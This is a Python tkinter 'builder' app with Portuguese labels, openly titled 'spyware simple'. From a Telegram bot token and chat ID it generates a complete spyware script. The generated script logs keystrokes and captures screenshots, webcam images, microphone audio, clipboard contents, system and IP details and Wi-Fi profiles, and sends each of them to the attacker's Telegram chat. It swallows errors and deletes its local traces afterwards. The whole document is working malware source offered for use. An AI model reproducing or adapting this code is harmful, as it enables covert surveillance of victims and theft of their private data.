import tkinter as tk
from tkinter import messagebox, ttk
from PIL import Image, ImageTk
import os

class BuilderApp:
    def __init__(self, root):
        self.root = root
        self.root.title("spyware simple - by LIMAX")
        self.root.geometry("1000x800")
        self.root.resizable(False, False)
        
        # Carregar ícone
        self.icon_image = None
        self.setup_icon()
        
        # Configurar tema roxo e preto
        self.setup_theme()
        
        # Variáveis
        self.token_var = tk.StringVar()
        self.chat_id_var = tk.StringVar()
        self.filename_var = tk.StringVar(value="coletor.py")
        
        # Opções
        self.opt_webcam = tk.BooleanVar(value=True)
        self.opt_screenshot = tk.BooleanVar(value=True)
        self.opt_mic = tk.BooleanVar(value=True)
        self.opt_keylogger = tk.BooleanVar(value=True)
        self.opt_sysinfo = tk.BooleanVar(value=True)
        self.opt_netinfo = tk.BooleanVar(value=True)
        self.opt_clipboard = tk.BooleanVar(value=True)

        self.setup_ui()

    def setup_icon(self):
        """Configura o ícone da aplicação e carrega a imagem"""
        icon_path = "img/icone.png"
        
        # Ícone da janela
        if os.path.exists(icon_path):
            try:
                icon = tk.PhotoImage(file=icon_path)
                self.root.iconphoto(True, icon)
            except:
                pass
        
        # Carregar imagem para usar na interface
        if os.path.exists(icon_path):
            try:
                # Carregar e redimensionar a imagem
                img = Image.open(icon_path)
                img = img.resize((100, 100), Image.Resampling.LANCZOS)  # Redimensionar para 32x32 pixels
                self.icon_image = ImageTk.PhotoImage(img)
            except Exception as e:
                print(f"Erro ao carregar imagem: {e}")
                self.icon_image = None

    def setup_theme(self):
        """Configura o tema roxo e preto"""
        # Cores principais
        self.bg_color = "#0a0a0a"  # Preto quase puro
        self.accent_color = "#8a2be2"  # Roxo
        self.secondary_color = "#1a1a1a"  # Preto mais claro
        self.text_color = "#ffffff"  # Branco
        self.entry_bg = "#2a2a2a"  # Cinza escuro para campos
        
        # Configurar estilo ttk
        self.style = ttk.Style()
        
        # Configurar cores do root
        self.root.configure(bg=self.bg_color)
        
        # Configurar estilos para widgets ttk
        self.style.theme_use('default')
        
        # Frame principal
        self.style.configure('Main.TFrame', background=self.bg_color)
        
        # Labels
        self.style.configure('Title.TLabel', 
                            background=self.bg_color,
                            foreground=self.accent_color,
                            font=('Consolas', 14, 'bold'))
        
        self.style.configure('Subtitle.TLabel',
                           background=self.bg_color,
                           foreground=self.text_color,
                           font=('Consolas', 10, 'bold'))
        
        self.style.configure('Normal.TLabel',
                           background=self.bg_color,
                           foreground=self.text_color)
        
        # Entradas
        self.style.configure('TEntry',
                           fieldbackground=self.entry_bg,
                           foreground=self.text_color,
                           borderwidth=2,
                           relief='flat')
        self.style.map('TEntry',
                      fieldbackground=[('active', self.entry_bg)],
                      foreground=[('active', self.text_color)])
        
        # Checkbuttons
        self.style.configure('TCheckbutton',
                           background=self.bg_color,
                           foreground=self.text_color)
        self.style.map('TCheckbutton',
                      background=[('active', self.bg_color)],
                      foreground=[('active', self.text_color)])
        
        # Botões
        self.style.configure('TButton',
                           background=self.accent_color,
                           foreground=self.text_color,
                           borderwidth=0,
                           focuscolor=self.accent_color)
        self.style.map('TButton',
                      background=[('active', '#7a1bd2')],
                      foreground=[('active', self.text_color)])

    def setup_ui(self):
        main_frame = ttk.Frame(self.root, style='Main.TFrame', padding="20")
        main_frame.pack(fill=tk.BOTH, expand=True)
        
        title_container = tk.Frame(main_frame, bg=self.bg_color)
        title_container.pack(pady=(0, 20))
        
        if self.icon_image:
            icon_label = tk.Label(title_container,
                                 image=self.icon_image,
                                 bg=self.bg_color)
            icon_label.pack(side=tk.LEFT, padx=(0, 10))
        
        title_text = tk.Label(title_container,
                             text="eye of Argos",
                             font=("Consolas", 16, "bold"),
                             bg=self.bg_color,
                             fg=self.accent_color)
        title_text.pack(side=tk.LEFT)
        
        subtitle = tk.Label(main_frame,
                           text="Configurações do Bot",
                           font=("Consolas", 12),
                           bg=self.bg_color,
                           fg=self.text_color)
        subtitle.pack(pady=(0, 20))

        input_frame = tk.Frame(main_frame, bg=self.bg_color)
        input_frame.pack(fill=tk.X, pady=(0, 10))

        token_label = tk.Label(input_frame,
                              text="Telegram Bot Token:",
                              font=("Consolas", 10),
                              bg=self.bg_color,
                              fg=self.text_color)
        token_label.pack(anchor=tk.W, pady=(5, 2))
        
        token_entry = tk.Entry(input_frame,
                              textvariable=self.token_var,
                              width=60,
                              bg=self.entry_bg,
                              fg=self.text_color,
                              insertbackground=self.text_color,
                              relief='flat',
                              font=("Consolas", 9))
        token_entry.pack(pady=(0, 10))

        chat_label = tk.Label(input_frame,
                             text="Telegram Chat ID:",
                             font=("Consolas", 10),
                             bg=self.bg_color,
                             fg=self.text_color)
        chat_label.pack(anchor=tk.W, pady=(5, 2))
        
        chat_entry = tk.Entry(input_frame,
                             textvariable=self.chat_id_var,
                             width=60,
                             bg=self.entry_bg,
                             fg=self.text_color,
                             insertbackground=self.text_color,
                             relief='flat',
                             font=("Consolas", 9))
        chat_entry.pack(pady=(0, 10))

        filename_label = tk.Label(input_frame,
                                 text="Nome do Arquivo de Saída (.py):",
                                 font=("Consolas", 10),
                                 bg=self.bg_color,
                                 fg=self.text_color)
        filename_label.pack(anchor=tk.W, pady=(5, 2))
        
        filename_entry = tk.Entry(input_frame,
                                 textvariable=self.filename_var,
                                 width=60,
                                 bg=self.entry_bg,
                                 fg=self.text_color,
                                 insertbackground=self.text_color,
                                 relief='flat',
                                 font=("Consolas", 9))
        filename_entry.pack(pady=(0, 10))


        separator = tk.Frame(main_frame, height=2, bg=self.accent_color)
        separator.pack(fill=tk.X, pady=15)


        options_title = tk.Label(main_frame,
                                text="Recursos para Incluir:",
                                font=("Consolas", 11, "bold"),
                                bg=self.bg_color,
                                fg=self.accent_color)
        options_title.pack(anchor=tk.W, pady=(0, 10))


        check_frame = tk.Frame(main_frame, bg=self.bg_color)
        check_frame.pack(anchor=tk.W, pady=(0, 20))


        checkboxes = [
            ("Captura de Webcam", self.opt_webcam),
            ("Screenshots da Tela", self.opt_screenshot),
            ("Gravação de Microfone", self.opt_mic),
            ("Keylogger (Teclas)", self.opt_keylogger),
            ("Informações do Sistema", self.opt_sysinfo),
            ("Informações de Rede/WiFi", self.opt_netinfo),
            ("Clipboard (Área de Transferência)", self.opt_clipboard)
        ]

        for i, (text, var) in enumerate(checkboxes):
            checkbox = tk.Checkbutton(check_frame,
                                     text=text,
                                     variable=var,
                                     font=("Consolas", 9),
                                     bg=self.bg_color,
                                     fg=self.text_color,
                                     activebackground=self.bg_color,
                                     activeforeground=self.text_color,
                                     selectcolor=self.bg_color,
                                     padx=10,
                                     pady=2)
            checkbox.pack(anchor=tk.W)

        generate_btn = tk.Button(main_frame,
                                text="GERAR CÓDIGO",
                                command=self.generate_code,
                                font=("Consolas", 11, "bold"),
                                bg=self.accent_color,
                                fg=self.text_color,
                                activebackground='#7a1bd2',
                                activeforeground=self.text_color,
                                relief='flat',
                                padx=30,
                                pady=10,
                                cursor='hand2')
        generate_btn.pack(pady=30)


        def on_enter(e):
            generate_btn['bg'] = '#7a1bd2'
        
        def on_leave(e):
            generate_btn['bg'] = self.accent_color
        
        generate_btn.bind("<Enter>", on_enter)
        generate_btn.bind("<Leave>", on_leave)

    def generate_code(self):
        token = self.token_var.get().strip()
        chat_id = self.chat_id_var.get().strip()
        filename = self.filename_var.get().strip()

        if not token or not chat_id:
            messagebox.showerror("Erro", "Token e Chat ID são obrigatórios!")
            return

        if not filename.endswith(".py"):
            filename += ".py"

        code = f"""import subprocess
import socket
import os
import re
import json
import time
import shutil
import requests
import logging
from multiprocessing import Process

"""
        if self.opt_clipboard.get():
            code += "import win32clipboard\n"
        if self.opt_webcam.get():
            code += "import cv2\n"
        if self.opt_mic.get():
            code += "import sounddevice\nfrom scipy.io.wavfile import write as write_rec\n"
        if self.opt_keylogger.get():
            code += "from pynput.keyboard import Key, Listener\n"
        if self.opt_screenshot.get():
            code += "from PIL import ImageGrab\n"

        code += f"""
# Configurações do Telegram
TELEGRAM_BOT_TOKEN = "{token}"
TELEGRAM_CHAT_ID = "{chat_id}"

################ Funções para Telegram ################

def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{{TELEGRAM_BOT_TOKEN}}/sendMessage"
    payload = {{'chat_id': TELEGRAM_CHAT_ID, 'text': message, 'parse_mode': 'HTML'}}
    try:
        requests.post(url, data=payload, timeout=10)
    except: pass

def send_file_to_telegram(file_path, caption=""):
    url = f"https://api.telegram.org/bot{{TELEGRAM_BOT_TOKEN}}/sendDocument"
    try:
        with open(file_path, 'rb') as file:
            files = {{'document': file}}
            data = {{'chat_id': TELEGRAM_CHAT_ID, 'caption': caption}}
            requests.post(url, files=files, data=data, timeout=30)
    except: pass

def send_photo_to_telegram(photo_path, caption=""):
    url = f"https://api.telegram.org/bot{{TELEGRAM_BOT_TOKEN}}/sendPhoto"
    try:
        with open(photo_path, 'rb') as photo:
            files = {{'photo': photo}}
            data = {{'chat_id': TELEGRAM_CHAT_ID, 'caption': caption}}
            requests.post(url, files=files, data=data, timeout=30)
    except: pass

################ Funções Principais ################
"""

        if self.opt_keylogger.get():
            code += """
def logg_keys(file_path):
    logging.basicConfig(filename=(file_path + 'key_logs.txt'), level=logging.DEBUG, format='%(asctime)s: %(message)s')
    def on_press(key):
        try: logging.info(str(key.char))
        except AttributeError:
            if key == Key.space: logging.info(" ")
            elif key == Key.enter: logging.info("\\n")
            else: logging.info(f"[{{key}}]")
    with Listener(on_press=on_press) as listener:
        listener.join()
"""

        if self.opt_screenshot.get():
            code += """
def screenshot(file_path):
    screenshots_dir = os.path.join(file_path, 'Screenshots')
    os.makedirs(screenshots_dir, exist_ok=True)
    for x in range(0, 5):
        try:
            pic = ImageGrab.grab()
            screenshot_path = os.path.join(screenshots_dir, f'screenshot{x}.png')
            pic.save(screenshot_path)
            send_photo_to_telegram(screenshot_path, f"Screenshot {x+1}")
            time.sleep(10)
        except: pass
"""

        if self.opt_mic.get():
            code += """
def microphone(file_path):
    for x in range(0, 3):
        try:
            fs = 44100
            seconds = 5
            myrecording = sounddevice.rec(int(seconds * fs), samplerate=fs, channels=2)
            sounddevice.wait()
            recording_path = file_path + f'mic_recording{x}.wav'
            write_rec(recording_path, fs, myrecording)
            send_file_to_telegram(recording_path, f"Gravação de Áudio {x+1}")
            os.remove(recording_path)
            time.sleep(5)
        except: pass
"""

        if self.opt_webcam.get():
            code += """
def webcam(file_path):
    webcam_dir = os.path.join(file_path, 'WebcamPics')
    os.makedirs(webcam_dir, exist_ok=True)
    try:
        cam = cv2.VideoCapture(0)
        for x in range(0, 5):
            ret, img = cam.read()
            if ret:
                photo_path = os.path.join(webcam_dir, f'webcam{x}.jpg')
                cv2.imwrite(photo_path, img)
                send_photo_to_telegram(photo_path, f"Webcam {x+1}")
                os.remove(photo_path)
                time.sleep(8)
    except: pass
    finally:
        if 'cam' in locals(): cam.release()
"""

        code += """
def main():
    base_dir = 'C:\\\\Users\\\\Public\\\\Logs'
    os.makedirs(base_dir, exist_ok=True)
    file_path = base_dir + '\\\\'
    send_to_telegram("📱 <b>Iniciando coleta de informações...</b>")
"""

        if self.opt_netinfo.get():
            code += """
    # Informações de Rede
    try:
        network_info = []
        ip_result = subprocess.run(['ipconfig', '/all'], capture_output=True, text=True, shell=True)
        network_info.append("=== IP CONFIG ===\\n" + ip_result.stdout)
        wifi_result = subprocess.run(['netsh', 'wlan', 'show', 'profiles'], capture_output=True, text=True, shell=True)
        network_info.append("\\n=== WIFI PROFILES ===\\n" + wifi_result.stdout)
        network_text = "\\n".join(network_info)
        with open(file_path + 'network_info.txt', 'w', encoding='utf-8') as f: f.write(network_text)
        chunks = [network_text[i:i+4000] for i in range(0, len(network_text), 4000)]
        for i, chunk in enumerate(chunks):
            send_to_telegram(f"🌐 <b>Informações de Rede (Parte {i+1}):</b>\\n<code>{chunk}</code>")
    except: pass
"""

        if self.opt_sysinfo.get():
            code += """
    # Informações do Sistema
    try:
        hostname = socket.gethostname()
        private_ip = socket.gethostbyname(hostname)
        try: public_ip = requests.get('https://api.ipify.org', timeout=5).text
        except: public_ip = "Não disponível"
        sys_info = f"Hostname: {hostname}\\nIP Privado: {private_ip}\\nIP Público: {public_ip}"
        send_to_telegram(f"💻 <b>Informações do Sistema:</b>\\n<code>{sys_info}</code>")
    except: pass
"""

        if self.opt_clipboard.get():
            code += """
    # Clipboard
    try:
        win32clipboard.OpenClipboard()
        data = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()
        if data.strip():
            send_to_telegram(f"📋 <b>Clipboard:</b>\\n<code>{data[:1000]}</code>")
    except: pass
"""

        code += """
    # Processos Paralelos
    processes = []
"""
        if self.opt_keylogger.get(): code += "    p1 = Process(target=logg_keys, args=(file_path,)); processes.append(p1); p1.start()\n"
        if self.opt_screenshot.get(): code += "    p2 = Process(target=screenshot, args=(file_path,)); processes.append(p2); p2.start()\n"
        if self.opt_mic.get(): code += "    p3 = Process(target=microphone, args=(file_path,)); processes.append(p3); p3.start()\n"
        if self.opt_webcam.get(): code += "    p4 = Process(target=webcam, args=(file_path,)); processes.append(p4); p4.start()\n"

        code += """
    for p in processes: p.join(timeout=35)
    for p in processes:
        if p.is_alive(): p.terminate()

    try:
        shutil.rmtree(base_dir, ignore_errors=True)
        send_to_telegram("✅ <b>Coleta concluída!</b>")
    except: pass

if __name__ == '__main__':
    try: main()
    except: pass
"""
        try:
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(code)
            messagebox.showinfo("Sucesso", f"Arquivo '{filename}' gerado com sucesso!")
        except Exception as e:
            messagebox.showerror("Erro", f"Erro ao salvar arquivo: {e}")

if __name__ == "__main__":
    root = tk.Tk()
    app = BuilderApp(root)
    root.mainloop()
